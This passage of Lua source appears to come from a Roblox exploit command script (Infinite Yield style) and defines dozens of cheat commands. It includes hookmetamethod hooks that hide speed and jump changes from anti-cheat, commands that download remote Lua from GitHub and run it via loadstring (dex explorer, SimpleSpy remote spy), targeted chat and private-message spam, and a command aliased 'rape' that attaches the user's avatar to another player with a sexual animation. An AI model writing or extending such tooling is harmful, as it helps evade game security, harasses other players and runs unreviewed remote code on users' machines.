					if v:IsA("SpawnLocation") and v.BrickColor == team.TeamColor and v.AllowTeamChangeOnTouch == true then
						firetouchinterest(v, root, 0)
						firetouchinterest(v, root, 1)
						break
					end
				end
			else
				speaker.Team = team
			end
		end)
	
		addcmd('nobgui',{'unbgui','nobillboardgui','unbillboardgui','noname','rohg'},function(args, speaker)
			for i,v in pairs(speaker.Character:GetDescendants())do
				if v:IsA("BillboardGui") or v:IsA("SurfaceGui") then
					v:Destroy()
				end
			end
		end)
	
		addcmd('loopnobgui',{'loopunbgui','loopnobillboardgui','loopunbillboardgui','loopnoname','looprohg'},function(args, speaker)
			for i,v in pairs(speaker.Character:GetDescendants())do
				if v:IsA("BillboardGui") or v:IsA("SurfaceGui") then
					v:Destroy()
				end
			end
			local function charPartAdded(part)
				if part:IsA("BillboardGui") or part:IsA("SurfaceGui") then
					wait()
					part:Destroy()
				end
			end
			charPartTrigger = speaker.Character.DescendantAdded:Connect(charPartAdded)
		end)
	
		addcmd('unloopnobgui',{'unloopunbgui','unloopnobillboardgui','unloopunbillboardgui','unloopnoname','unlooprohg'},function(args, speaker)
			if charPartTrigger then
				charPartTrigger:Disconnect()
			end
		end)
	
		addcmd('spasm',{},function(args, speaker)
			if not r15(speaker) then
				local pchar=speaker.Character
				local AnimationId = "33796059"
				SpasmAnim = Instance.new("Animation")
				SpasmAnim.AnimationId = "rbxassetid://"..AnimationId
				Spasm = pchar:FindFirstChildOfClass('Humanoid'):LoadAnimation(SpasmAnim)
				Spasm:Play()
				Spasm:AdjustSpeed(99)
			else
				notify('R6 Required','This command requires the r6 rig type')
			end
		end)
	
		addcmd('unspasm',{'nospasm'},function(args, speaker)
			Spasm:Stop()
			SpasmAnim:Destroy()
		end)
	
		addcmd('headthrow',{},function(args, speaker)
			if not r15(speaker) then
				local AnimationId = "35154961"
				local Anim = Instance.new("Animation")
				Anim.AnimationId = "rbxassetid://"..AnimationId
				local k = speaker.Character:FindFirstChildOfClass('Humanoid'):LoadAnimation(Anim)
				k:Play(0)
				k:AdjustSpeed(1)
			else
				notify('R6 Required','This command requires the r6 rig type')
			end
		end)
	
		local function anim2track(asset_id)
			local objs = game:GetObjects(asset_id)
			for i = 1, #objs do
				if objs[i]:IsA("Animation") then
					return objs[i].AnimationId
				end
			end
			return asset_id
		end
	
		addcmd("animation", {"anim"}, function(args, speaker)
			local animid = tostring(args[1])
			if not animid:find("rbxassetid://") then
				animid = "rbxassetid://" .. animid
			end
			animid = anim2track(animid)
			local animation = Instance.new("Animation")
			animation.AnimationId = animid
			local anim = speaker.Character:FindFirstChildWhichIsA("Humanoid"):LoadAnimation(animation)
			anim.Priority = Enum.AnimationPriority.Movement
			anim:Play()
			if args[2] then anim:AdjustSpeed(tostring(args[2])) end
		end)
	
		addcmd("emote", {"em"}, function(args, speaker)
			local animid = tostring(args[1])
			if not animid:find("rbxassetid://") then
				animid = "rbxassetid://" .. animid
			end
	
			local anim = humanoid:PlayEmoteAndGetAnimTrackById(animid)
			if args[2] then anim:AdjustSpeed(tostring(args[2])) end
		end)
	
	
		addcmd('noanim',{},function(args, speaker)
			speaker.Character.Animate.Disabled = true
		end)
	
		addcmd('reanim',{},function(args, speaker)
			speaker.Character.Animate.Disabled = false
		end)
	
		addcmd('animspeed',{},function(args, speaker)
			local Char = speaker.Character
			local Hum = Char:FindFirstChildOfClass("Humanoid") or Char:FindFirstChildOfClass("AnimationController")
	
			for i,v in next, Hum:GetPlayingAnimationTracks() do
				v:AdjustSpeed(tonumber(args[1] or 1))
			end
		end)
	
		addcmd('copyanimation',{'copyanim','copyemote'},function(args, speaker)
			local players = getPlayer(args[1], speaker)
			for _,v in ipairs(players)do
				local char = Players[v].Character
				for _, v1 in pairs(speaker.Character:FindFirstChildOfClass('Humanoid'):GetPlayingAnimationTracks()) do
					v1:Stop()
				end
				for _, v1 in pairs(Players[v].Character:FindFirstChildOfClass('Humanoid'):GetPlayingAnimationTracks()) do
					if not string.find(v1.Animation.AnimationId, "507768375") then
						local ANIM = speaker.Character:FindFirstChildOfClass('Humanoid'):LoadAnimation(v1.Animation)
						ANIM:Play(.1, 1, v1.Speed)
						ANIM.TimePosition = v1.TimePosition
						task.spawn(function()
							v1.Stopped:Wait()
							ANIM:Stop()
							ANIM:Destroy()
						end)
					end
				end
			end
		end)
	
		addcmd("copyanimationid", {"copyanimid", "copyemoteid"}, function(args, speaker)
			local copyAnimId = function(player)
				local found = "Animations Copied"
	
				for _, v in pairs(player.Character:FindFirstChildWhichIsA("Humanoid"):GetPlayingAnimationTracks()) do
					local animationId = v.Animation.AnimationId
					local assetId = animationId:find("rbxassetid://") and animationId:match("%d+")
	
					if not string.find(animationId, "507768375") and not string.find(animationId, "180435571") then
						if assetId then
							local success, result = pcall(function()
								return MarketplaceService:GetProductInfo(tonumber(assetId)).Name
							end)
							local name = success and result or "Failed to get name"
							found = found .. "\n\nName: " .. name .. "\nAnimation Id: " .. animationId
						else
							found = found .. "\n\nAnimation Id: " .. animationId
						end
					end
				end
	
				if found ~= "Animations Copied" then
					toClipboard(found)
				else
					notify("Animations", "No animations to copy")
				end
			end
	
			if args[1] then
				copyAnimId(Players[getPlayer(args[1], speaker)[1]])
			else
				copyAnimId(speaker)
			end
		end)
	
		addcmd('stopanimations',{'stopanims','stopanim'},function(args, speaker)
			local Char = speaker.Character
			local Hum = Char:FindFirstChildOfClass("Humanoid") or Char:FindFirstChildOfClass("AnimationController")
	
			for i,v in next, Hum:GetPlayingAnimationTracks() do
				v:Stop()
			end
		end)
	
		addcmd('refreshanimations', {'refreshanimation', 'refreshanims', 'refreshanim'}, function(args, speaker)
			local Char = speaker.Character or speaker.CharacterAdded:Wait()
			local Human = Char and Char:WaitForChild('Humanoid', 15)
			local Animate = Char and Char:WaitForChild('Animate', 15)
			if not Human or not Animate then
				return notify('Refresh Animations', 'Failed to get Animate/Humanoid')
			end
			Animate.Disabled = true
			for _, v in ipairs(Human:GetPlayingAnimationTracks()) do
				v:Stop()
			end
			Animate.Disabled = false
		end)
	
		addcmd('allowcustomanim', {'allowcustomanimations'}, function(args, speaker)
			StarterPlayer.AllowCustomAnimations = true
			execCmd('refreshanimations')
		end)
	
		addcmd('unallowcustomanim', {'unallowcustomanimations'}, function(args, speaker)
			StarterPlayer.AllowCustomAnimations = false
			execCmd('refreshanimations')
		end)
	
		addcmd('loopanimation', {'loopanim'},function(args, speaker)
			local Char = speaker.Character
			local Human = Char and Char.FindFirstChildWhichIsA(Char, "Humanoid")
			for _, v in ipairs(Human.GetPlayingAnimationTracks(Human)) do
				v.Looped = true
			end
		end)
	
		addcmd('tpposition',{'tppos'},function(args, speaker)
			if #args < 3 then return end
			local tpX,tpY,tpZ = tonumber((args[1]:gsub(",", ""))),tonumber((args[2]:gsub(",", ""))),tonumber((args[3]:gsub(",", "")))
			local char = speaker.Character
			if char and getRoot(char) then
				getRoot(char).CFrame = CFrame.new(tpX,tpY,tpZ)
			end
		end)
	
		addcmd('tweentpposition',{'ttppos'},function(args, speaker)
			if #args < 3 then return end
			local tpX,tpY,tpZ = tonumber((args[1]:gsub(",", ""))),tonumber((args[2]:gsub(",", ""))),tonumber((args[3]:gsub(",", "")))
			local char = speaker.Character
			if char and getRoot(char) then
				TweenService:Create(getRoot(speaker.Character), TweenInfo.new(tweenSpeed, Enum.EasingStyle.Linear), {CFrame = CFrame.new(tpX,tpY,tpZ)}):Play()
			end
		end)
	
		addcmd('offset',{},function(args, speaker)
			if #args < 3 then
				return 
			end
			if speaker.Character then
				speaker.Character:TranslateBy(Vector3.new(tonumber(args[1]) or 0, tonumber(args[2]) or 0, tonumber(args[3]) or 0))
			end
		end)
	
		addcmd('tweenoffset',{'toffset'},function(args, speaker)
			if #args < 3 then return end
			local tpX,tpY,tpZ = tonumber(args[1]),tonumber(args[2]),tonumber(args[3])
			local char = speaker.Character
			if char and getRoot(char) then
				TweenService:Create(getRoot(speaker.Character), TweenInfo.new(tweenSpeed, Enum.EasingStyle.Linear), {CFrame = CFrame.new(tpX,tpY,tpZ)}):Play()
			end
		end)
	
		addcmd('clickteleport',{},function(args, speaker)
			if speaker == Players.LocalPlayer then
				notify('Click TP','Go to Settings > Keybinds > Add to set up click teleport')
			end
		end)
	
		addcmd("mouseteleport", {"mousetp"}, function(args, speaker)
			local root = getRoot(speaker.Character)
			local pos = IYMouse.Hit
			if root and pos then
				root.CFrame = CFrame.new(pos.X, pos.Y + 3, pos.Z, select(4, root.CFrame:components()))
			end
		end)
	
		addcmd('tptool', {'teleporttool'}, function(args, speaker)
			local TpTool = Instance.new("Tool")
			TpTool.Name = "Teleport Tool"
			TpTool.RequiresHandle = false
			TpTool.Parent = speaker.Backpack
			TpTool.Activated:Connect(function()
				local Char = speaker.Character or workspace:FindFirstChild(speaker.Name)
				local HRP = Char and Char:FindFirstChild("HumanoidRootPart")
				if not Char or not HRP then
					return warn("Failed to find HumanoidRootPart")
				end
				HRP.CFrame = CFrame.new(IYMouse.Hit.X, IYMouse.Hit.Y + 3, IYMouse.Hit.Z, select(4, HRP.CFrame:components()))
			end)
		end)
	
		addcmd('clickdelete',{},function(args, speaker)
			if speaker == Players.LocalPlayer then
				notify('Click Delete','Go to Settings > Keybinds > Add to set up click delete')
			end
		end)
	
		addcmd('getposition',{'getpos','notifypos','notifyposition'},function(args, speaker)
			local players = getPlayer(args[1], speaker)
			for i,v in pairs(players)do
				local char = Players[v].Character
				local pos = char and (getRoot(char) or char:FindFirstChildWhichIsA("BasePart"))
				pos = pos and pos.Position
				if not pos then
					return notify('Getposition Error','Missing character')
				end
				local roundedPos = math.round(pos.X) .. ", " .. math.round(pos.Y) .. ", " .. math.round(pos.Z)
				notify('Current Position',roundedPos)
			end
		end)
	
		addcmd('copyposition',{'copypos'},function(args, speaker)
			local players = getPlayer(args[1], speaker)
			for i,v in pairs(players)do
				local char = Players[v].Character
				local pos = char and (getRoot(char) or char:FindFirstChildWhichIsA("BasePart"))
				pos = pos and pos.Position
				if not pos then
					return notify('Getposition Error','Missing character')
				end
				local roundedPos = math.round(pos.X) .. ", " .. math.round(pos.Y) .. ", " .. math.round(pos.Z)
				toClipboard(roundedPos)
			end
		end)
	
		addcmd('walktopos',{'walktoposition'},function(args, speaker)
			if speaker.Character:FindFirstChildOfClass('Humanoid') and speaker.Character:FindFirstChildOfClass('Humanoid').SeatPart then
				speaker.Character:FindFirstChildOfClass('Humanoid').Sit = false
				wait(.1)
			end
			speaker.Character:FindFirstChildOfClass('Humanoid').WalkToPoint = Vector3.new(args[1],args[2],args[3])
		end)
	
		addcmd('speed',{'ws','walkspeed'},function(args, speaker)
			if args[2] then
				local speed = args[2] or 16
				if isNumber(speed) then
					speaker.Character:FindFirstChildOfClass('Humanoid').WalkSpeed = speed
				end
			else
				local speed = args[1] or 16
				if isNumber(speed) then
					speaker.Character:FindFirstChildOfClass('Humanoid').WalkSpeed = speed
				end
			end
		end)
	
		addcmd('spoofspeed',{'spoofws','spoofwalkspeed'},function(args, speaker)
			if args[1] and isNumber(args[1]) then
				if hookmetamethod then
					local char = speaker.Character
					local setspeed;
					local index; index = hookmetamethod(game, "__index", function(self, key)
						if not checkcaller() and typeof(self) == "Instance" and self:IsA("Humanoid") and (key == "WalkSpeed" or key == "walkSpeed") and self:IsDescendantOf(char) then
							return setspeed or args[1]
						end
						return index(self, key)
					end)
					local newindex; newindex = hookmetamethod(game, "__newindex", function(self, key, value)
						if not checkcaller() and typeof(self) == "Instance" and self:IsA("Humanoid") and (key == "WalkSpeed" or key == "walkSpeed") and self:IsDescendantOf(char) then
							setspeed = tonumber(value)
						end
						return newindex(self, key, value)
					end)
				else
					notify('Incompatible Exploit','Your exploit does not support this command (missing hookmetamethod)')
				end
			end
		end)
	
		addcmd('loopspeed',{'loopws'},function(args, speaker)
			local speed = args[1] or 16
			if args[2] then
				speed = args[2] or 16
			end
			if isNumber(speed) then
				local Char = speaker.Character or workspace:FindFirstChild(speaker.Name)
				local Human = Char and Char:FindFirstChildWhichIsA("Humanoid")
				local function WalkSpeedChange()
					if Char and Human then
						Human.WalkSpeed = speed
					end
				end
				WalkSpeedChange()
				HumanModCons.wsLoop = (HumanModCons.wsLoop and HumanModCons.wsLoop:Disconnect() and false) or Human:GetPropertyChangedSignal("WalkSpeed"):Connect(WalkSpeedChange)
				HumanModCons.wsCA = (HumanModCons.wsCA and HumanModCons.wsCA:Disconnect() and false) or speaker.CharacterAdded:Connect(function(nChar)
					Char, Human = nChar, nChar:WaitForChild("Humanoid")
					WalkSpeedChange()
					HumanModCons.wsLoop = (HumanModCons.wsLoop and HumanModCons.wsLoop:Disconnect() and false) or Human:GetPropertyChangedSignal("WalkSpeed"):Connect(WalkSpeedChange)
				end)
			end
		end)
	
		addcmd('unloopspeed',{'unloopws'},function(args, speaker)
			HumanModCons.wsLoop = (HumanModCons.wsLoop and HumanModCons.wsLoop:Disconnect() and false) or nil
			HumanModCons.wsCA = (HumanModCons.wsCA and HumanModCons.wsCA:Disconnect() and false) or nil
		end)
	
		addcmd('spoofjumppower',{'spoofjp'},function(args, speaker)
			if args[1] and isNumber(args[1]) then
				if hookmetamethod then
					local char = speaker.Character
					local setpower;
					local index; index = hookmetamethod(game, "__index", function(self, key)
						if not checkcaller() and typeof(self) == "Instance" and self:IsA("Humanoid") and (key == "JumpPower" or key == "jumpPower") and self:IsDescendantOf(char) then
							return setpower or args[1]
						end
						return index(self, key)
					end)
					local newindex; newindex = hookmetamethod(game, "__newindex", function(self, key, value)
						if not checkcaller() and typeof(self) == "Instance" and self:IsA("Humanoid") and (key == "JumpPower" or key == "jumpPower") and self:IsDescendantOf(char) then
							setpower = tonumber(value)
						end
						return newindex(self, key, value)
					end)
				else
					notify('Incompatible Exploit','Your exploit does not support this command (missing hookmetamethod)')
				end
			end
		end)
	
		addcmd('loopjumppower',{'loopjp','loopjpower'},function(args, speaker)
			local jpower = args[1] or 50
			if isNumber(jpower) then
				local Char = speaker.Character or workspace:FindFirstChild(speaker.Name)
				local Human = Char and Char:FindFirstChildWhichIsA("Humanoid")
				local function JumpPowerChange()
					if Char and Human then
						if speaker.Character:FindFirstChildOfClass('Humanoid').UseJumpPower then
							speaker.Character:FindFirstChildOfClass('Humanoid').JumpPower = jpower
						else
							speaker.Character:FindFirstChildOfClass('Humanoid').JumpHeight  = jpower
						end
					end
				end
				JumpPowerChange()
				HumanModCons.jpLoop = (HumanModCons.jpLoop and HumanModCons.jpLoop:Disconnect() and false) or Human:GetPropertyChangedSignal("JumpPower"):Connect(JumpPowerChange)
				HumanModCons.jpCA = (HumanModCons.jpCA and HumanModCons.jpCA:Disconnect() and false) or speaker.CharacterAdded:Connect(function(nChar)
					Char, Human = nChar, nChar:WaitForChild("Humanoid")
					JumpPowerChange()
					HumanModCons.jpLoop = (HumanModCons.jpLoop and HumanModCons.jpLoop:Disconnect() and false) or Human:GetPropertyChangedSignal("JumpPower"):Connect(JumpPowerChange)
				end)
			end
		end)
	
		addcmd('unloopjumppower',{'unloopjp','unloopjpower'},function(args, speaker)
			local Char = speaker.Character or workspace:FindFirstChild(speaker.Name)
			local Human = Char and Char:FindFirstChildWhichIsA("Humanoid")
			HumanModCons.jpLoop = (HumanModCons.jpLoop and HumanModCons.jpLoop:Disconnect() and false) or nil
			HumanModCons.jpCA = (HumanModCons.jpCA and HumanModCons.jpCA:Disconnect() and false) or nil
			if Char and Human then
				if speaker.Character:FindFirstChildOfClass('Humanoid').UseJumpPower then
					speaker.Character:FindFirstChildOfClass('Humanoid').JumpPower = 50
				else
					speaker.Character:FindFirstChildOfClass('Humanoid').JumpHeight  = 50
				end
			end
		end)
	
		addcmd('tools',{'gears'},function(args, speaker)
			local function copy(instance)
				for i,c in pairs(instance:GetChildren())do
					if c:IsA('Tool') or c:IsA('HopperBin') then
						c:Clone().Parent = speaker:FindFirstChildOfClass("Backpack")
					end
					copy(c)
				end
			end
			copy(Lighting)
			local function copy(instance)
				for i,c in pairs(instance:GetChildren())do
					if c:IsA('Tool') or c:IsA('HopperBin') then
						c:Clone().Parent = speaker:FindFirstChildOfClass("Backpack")
					end
					copy(c)
				end
			end
			copy(ReplicatedStorage)
			notify('Tools','Copied tools from ReplicatedStorage and Lighting')
		end)
	
		addcmd('notools',{'rtools','clrtools','removetools','deletetools','dtools'},function(args, speaker)
			for i,v in pairs(speaker:FindFirstChildOfClass("Backpack"):GetDescendants()) do
				if v:IsA('Tool') or v:IsA('HopperBin') then
					v:Destroy()
				end
			end
			for i,v in pairs(speaker.Character:GetDescendants()) do
				if v:IsA('Tool') or v:IsA('HopperBin') then
					v:Destroy()
				end
			end
		end)
	
		addcmd('deleteselectedtool',{'dst'},function(args, speaker)
			for i,v in pairs(speaker.Character:GetDescendants()) do
				if v:IsA('Tool') or v:IsA('HopperBin') then
					v:Destroy()
				end
			end
		end)
	
		addcmd("console", {}, function(args, speaker)
			StarterGui:SetCore("DevConsoleVisible", true)
		end)
	
		addcmd('oldconsole',{},function(args, speaker)
			-- Thanks wally!!
			notify("Loading",'Hold on a sec')
			local _, str = pcall(function()
				return game:HttpGet("https://raw.githubusercontent.com/infyiff/backup/main/console.lua", true)
			end)
	
			local s, e = loadstring(str)
			if typeof(s) ~= "function" then
				return
			end
	
			local success, message = pcall(s)
			if (not success) then
				if printconsole then
					printconsole(message)
				elseif printoutput then
					printoutput(message)
				end
			end
			wait(1)
			notify('Console','Press F9 to open the console')
		end)
	
		addcmd("explorer", {"dex"}, function(args, speaker)
			notify("Loading", "Hold on a sec")
			loadstring(game:HttpGet("https://raw.githubusercontent.com/infyiff/backup/main/dex.lua"))()
		end)
	
		addcmd('olddex', {'odex'}, function(args, speaker)
			notify('Loading old explorer', 'Hold on a sec')
	
			local getobjects = function(a)
				local Objects = {}
				if a then
					local b = InsertService:LoadLocalAsset(a)
					if b then 
						table.insert(Objects, b) 
					end
				end
				return Objects
			end
	
			local Dex = getobjects("rbxassetid://10055842438")[1]
			Dex.Parent = PARENT
	
			local function Load(Obj, Url)
				local function GiveOwnGlobals(Func, Script)
					-- Fix for this edit of dex being poorly made
					-- I (Alex) would like to commemorate whoever added this dex in somehow finding the worst dex to ever exist
					local Fenv, RealFenv, FenvMt = {}, {
						script = Script,
						getupvalue = function(a, b)
							return nil -- force it to use globals
						end,
						getreg = function() -- It loops registry for some idiotic reason so stop it from doing that and just use a global
							return {} -- force it to use globals
						end,
						getprops = getprops or function(inst)
							if getproperties then
								local props = getproperties(inst)
								if props[1] and gethiddenproperty then
									local results = {}
									for _,name in pairs(props) do
										local success, res = pcall(gethiddenproperty, inst, name)
										if success then
											results[name] = res
										end
									end
	
									return results
								end
	
								return props
							end
	
							return {}
						end
					}, {}
					FenvMt.__index = function(a,b)
						return RealFenv[b] == nil and getgenv()[b] or RealFenv[b]
					end
					FenvMt.__newindex = function(a, b, c)
						if RealFenv[b] == nil then 
							getgenv()[b] = c 
						else 
							RealFenv[b] = c 
						end
					end
					setmetatable(Fenv, FenvMt)
					pcall(setfenv, Func, Fenv)
					return Func
				end
	
				local function LoadScripts(_, Script)
					if Script:IsA("LocalScript") then
						task.spawn(function()
							GiveOwnGlobals(loadstring(Script.Source,"="..Script:GetFullName()), Script)()
						end)
					end
					table.foreach(Script:GetChildren(), LoadScripts)
				end
	
				LoadScripts(nil, Obj)
			end
	
			Load(Dex)
		end)
	
		addcmd('remotespy',{'rspy'},function(args, speaker)
			notify("Loading",'Hold on a sec')
			-- Full credit to exx, creator of SimpleSpy
			-- also thanks to Amity for fixing
			loadstring(game:HttpGet("https://raw.githubusercontent.com/infyiff/backup/main/SimpleSpyV3/main.lua"))()
		end)
	
		addcmd('audiologger',{'alogger'},function(args, speaker)
			notify("Loading",'Hold on a sec')
			loadstring(game:HttpGet(('https://raw.githubusercontent.com/infyiff/backup/main/audiologger.lua'),true))()
		end)
	
		local loopgoto = nil
		addcmd('loopgoto',{},function(args, speaker)
			local players = getPlayer(args[1], speaker)
			for i,v in pairs(players)do
				loopgoto = nil
				if speaker.Character:FindFirstChildOfClass('Humanoid') and speaker.Character:FindFirstChildOfClass('Humanoid').SeatPart then
					speaker.Character:FindFirstChildOfClass('Humanoid').Sit = false
					wait(.1)
				end
				loopgoto = Players[v]
				local distance = 3
				if args[2] and isNumber(args[2]) then
					distance = args[2]
				end
				local lDelay = 0
				if args[3] and isNumber(args[3]) then
					lDelay = args[3]
				end
				repeat
					if Players:FindFirstChild(v) then
						if Players[v].Character ~= nil then
							getRoot(speaker.Character).CFrame = getRoot(Players[v].Character).CFrame + Vector3.new(distance,1,0)
						end
						wait(lDelay)
					else
						loopgoto = nil
					end
				until loopgoto ~= Players[v]
			end
		end)
	
		addcmd('unloopgoto',{'noloopgoto'},function(args, speaker)
			loopgoto = nil
		end)
	
		addcmd('headsit',{},function(args, speaker)
			local players = getPlayer(args[1], speaker)
			if headSit then headSit:Disconnect() end
			for i,v in pairs(players)do
				speaker.Character:FindFirstChildOfClass('Humanoid').Sit = true
				headSit = RunService.Heartbeat:Connect(function()
					if Players:FindFirstChild(Players[v].Name) and Players[v].Character ~= nil and getRoot(Players[v].Character) and getRoot(speaker.Character) and speaker.Character:FindFirstChildOfClass('Humanoid').Sit == true then
						getRoot(speaker.Character).CFrame = getRoot(Players[v].Character).CFrame * CFrame.Angles(0,math.rad(0),0)* CFrame.new(0,1.6,0.4)
					else
						headSit:Disconnect()
					end
				end)
			end
		end)
	
		addcmd('chat',{'say'},function(args, speaker)
			local cString = getstring(1)
			chatMessage(cString)
		end)
	
	
		spamming = false
		spamspeed = 1
		addcmd('spam',{},function(args, speaker)
			spamming = true
			local spamstring = getstring(1)
			repeat wait(spamspeed)
				chatMessage(spamstring)
			until spamming == false
		end)
	
		addcmd('nospam',{'unspam'},function(args, speaker)
			spamming = false
		end)
	
		addcmd('whisper',{'pm'},function(args, speaker)
			local players = getPlayer(args[1], speaker)
			for i,v in pairs(players)do
				task.spawn(function()
					local plrName = Players[v].Name
					local pmstring = getstring(2)
					chatMessage("/w "..plrName.." "..pmstring)
				end)
			end
		end)
	
		pmspamming = {}
		addcmd('pmspam',{},function(args, speaker)
			local players = getPlayer(args[1], speaker)
			for i,v in pairs(players)do
				task.spawn(function()
					local plrName = Players[v].Name
					if FindInTable(pmspamming, plrName) then return end
					table.insert(pmspamming, plrName)
					local pmspamstring = getstring(2)
					repeat
						if Players:FindFirstChild(v) then
							wait(spamspeed)
							chatMessage("/w "..plrName.." "..pmspamstring)
						else
							for a,b in pairs(pmspamming) do if b == plrName then table.remove(pmspamming, a) end end
						end
					until not FindInTable(pmspamming, plrName)
				end)
			end
		end)
	
		addcmd('nopmspam',{'unpmspam'},function(args, speaker)
			local players = getPlayer(args[1], speaker)
			for i,v in pairs(players)do
				task.spawn(function()
					for a,b in pairs(pmspamming) do
						if b == Players[v].Name then
							table.remove(pmspamming, a)
						end
					end
				end)
			end
		end)
	
		addcmd('spamspeed',{},function(args, speaker)
			local speed = args[1] or 1
			if isNumber(speed) then
				spamspeed = speed
			end
		end)
	
		addcmd('bubblechat',{},function(args, speaker)
			if isLegacyChat then
				ChatService.BubbleChatEnabled = true
			else
				TextChatService.BubbleChatConfiguration.Enabled = true
			end
		end)
	
		addcmd('unbubblechat',{'nobubblechat'},function(args, speaker)
			if isLegacyChat then
				ChatService.BubbleChatEnabled = false
			else
				TextChatService.BubbleChatConfiguration.Enabled = false
			end
		end)
	
		addcmd('blockhead',{},function(args, speaker)
			speaker.Character.Head:FindFirstChildOfClass("SpecialMesh"):Destroy()
		end)
	
		addcmd('blockhats',{},function(args, speaker)
			for _,v in pairs(speaker.Character:FindFirstChildOfClass('Humanoid'):GetAccessories()) do
				for i,c in pairs(v:GetDescendants()) do
					if c:IsA("SpecialMesh") then
						c:Destroy()
					end
				end
			end
		end)
	
		addcmd('blocktool',{},function(args, speaker)
			for _,v in pairs(speaker.Character:GetChildren()) do
				if v:IsA("Tool") or v:IsA("HopperBin") then
					for i,c in pairs(v:GetDescendants()) do
						if c:IsA("SpecialMesh") then
							c:Destroy()
						end
					end
				end
			end
		end)
	
		addcmd('creeper',{},function(args, speaker)
			if r15(speaker) then
				speaker.Character.Head:FindFirstChildOfClass("SpecialMesh"):Destroy()
				speaker.Character.LeftUpperArm:Destroy()
				speaker.Character.RightUpperArm:Destroy()
				speaker.Character:FindFirstChildOfClass("Humanoid"):RemoveAccessories()
			else
				speaker.Character.Head:FindFirstChildOfClass("SpecialMesh"):Destroy()
				speaker.Character["Left Arm"]:Destroy()
				speaker.Character["Right Arm"]:Destroy()
				speaker.Character:FindFirstChildOfClass("Humanoid"):RemoveAccessories()
			end
		end)
	
		function getTorso(x)
			x = x or Players.LocalPlayer.Character
			return x:FindFirstChild("Torso") or x:FindFirstChild("UpperTorso") or x:FindFirstChild("LowerTorso") or x:FindFirstChild("HumanoidRootPart")
		end
	
		addcmd("bang", {"rape"}, function(args, speaker)
			execCmd("unbang")
			wait()
			local humanoid = speaker.Character:FindFirstChildWhichIsA("Humanoid")
			bangAnim = Instance.new("Animation")
			bangAnim.AnimationId = not r15(speaker) and "rbxassetid://148840371" or "rbxassetid://5918726674"
			bang = humanoid:LoadAnimation(bangAnim)
			bang:Play(0.1, 1, 1)
			bang:AdjustSpeed(args[2] or 3)
			bangDied = humanoid.Died:Connect(function()
				bang:Stop()
				bangAnim:Destroy()
				bangDied:Disconnect()
				bangLoop:Disconnect()
			end)
			if args[1] then
				local players = getPlayer(args[1], speaker)
				for _, v in pairs(players) do
					local bangplr = Players[v].Name
					local bangOffet = CFrame.new(0, 0, 1.1)
					bangLoop = RunService.Stepped:Connect(function()
						pcall(function()
							local otherRoot = getTorso(Players[bangplr].Character)
							getRoot(speaker.Character).CFrame = otherRoot.CFrame * bangOffet
						end)
					end)
				end
			end
		end)
	
		addcmd("unbang", {"unrape"}, function(args, speaker)
			if bangDied then
				bangDied:Disconnect()
				bang:Stop()
				bangAnim:Destroy()
				bangLoop:Disconnect()
			end
		end)
	
		addcmd('carpet',{},function(args, speaker)
			if not r15(speaker) then
				execCmd('uncarpet')
				wait()
				local players = getPlayer(args[1], speaker)
				for i,v in pairs(players)do
					carpetAnim = Instance.new("Animation")
					carpetAnim.AnimationId = "rbxassetid://282574440"
					carpet = speaker.Character:FindFirstChildOfClass('Humanoid'):LoadAnimation(carpetAnim)
					carpet:Play(.1, 1, 1)
					local carpetplr = Players[v].Name
					carpetDied = speaker.Character:FindFirstChildOfClass'Humanoid'.Died:Connect(function()
						carpetLoop:Disconnect()
						carpet:Stop()
						carpetAnim:Destroy()
						carpetDied:Disconnect()
					end)
					carpetLoop = RunService.Heartbeat:Connect(function()
						pcall(function()
							getRoot(Players.LocalPlayer.Character).CFrame = getRoot(Players[carpetplr].Character).CFrame
						end)
					end)
				end
			else
				notify('R6 Required','This command requires the r6 rig type')
			end
		end)
	
		addcmd('uncarpet',{'nocarpet'},function(args, speaker)
			if carpetLoop then
				carpetLoop:Disconnect()
				carpetDied:Disconnect()
				carpet:Stop()
				carpetAnim:Destroy()
			end
		end)
	
		addcmd('friend',{},function(args, speaker)
			local players = getPlayer(args[1], speaker)
			for i,v in pairs(players)do
				speaker:RequestFriendship(Players[v])
			end
		end)
	
		addcmd('unfriend',{},function(args, speaker)
			local players = getPlayer(args[1], speaker)
			for i,v in pairs(players)do
				speaker:RevokeFriendship(Players[v])
			end
		end)
	
		addcmd('bringpart',{},function(args, speaker)
			for i,v in pairs(workspace:GetDescendants()) do
				if v.Name:lower() == getstring(1):lower() and v:IsA("BasePart") then
					v.CFrame = getRoot(speaker.Character).CFrame
				end
			end
		end)
	
		addcmd('bringpartclass',{'bpc'},function(args, speaker)
			for i,v in pairs(workspace:GetDescendants()) do
				if v.ClassName:lower() == getstring(1):lower() and v:IsA("BasePart") then
					v.CFrame = getRoot(speaker.Character).CFrame
				end
			end
		end)
	
		gotopartDelay = 0.1
		addcmd('gotopart',{'topart'},function(args, speaker)
			for i,v in pairs(workspace:GetDescendants()) do
				if v.Name:lower() == getstring(1):lower() and v:IsA("BasePart") then
					if speaker.Character:FindFirstChildOfClass('Humanoid') and speaker.Character:FindFirstChildOfClass('Humanoid').SeatPart then
						speaker.Character:FindFirstChildOfClass('Humanoid').Sit = false
						wait(.1)
					end
					wait(gotopartDelay)
					getRoot(speaker.Character).CFrame = v.CFrame
				end
			end
		end)
	
		addcmd('tweengotopart',{'tgotopart','ttopart'},function(args, speaker)
			for i,v in pairs(workspace:GetDescendants()) do
				if v.Name:lower() == getstring(1):lower() and v:IsA("BasePart") then
					if speaker.Character:FindFirstChildOfClass('Humanoid') and speaker.Character:FindFirstChildOfClass('Humanoid').SeatPart then
						speaker.Character:FindFirstChildOfClass('Humanoid').Sit = false
						wait(.1)
					end
					wait(gotopartDelay)
					TweenService:Create(getRoot(speaker.Character), TweenInfo.new(tweenSpeed, Enum.EasingStyle.Linear), {CFrame = v.CFrame}):Play()
				end
			end
		end)
	
		addcmd('gotopartclass',{'gpc'},function(args, speaker)
			for i,v in pairs(workspace:GetDescendants()) do
				if v.ClassName:lower() == getstring(1):lower() and v:IsA("BasePart") then
					if speaker.Character:FindFirstChildOfClass('Humanoid') and speaker.Character:FindFirstChildOfClass('Humanoid').SeatPart then
						speaker.Character:FindFirstChildOfClass('Humanoid').Sit = false
						wait(.1)
					end
					wait(gotopartDelay)
					getRoot(speaker.Character).CFrame = v.CFrame
				end
			end
		end)
	
		addcmd('tweengotopartclass',{'tgpc'},function(args, speaker)
			for i,v in pairs(workspace:GetDescendants()) do
				if v.ClassName:lower() == getstring(1):lower() and v:IsA("BasePart") then
					if speaker.Character:FindFirstChildOfClass('Humanoid') and speaker.Character:FindFirstChildOfClass('Humanoid').SeatPart then
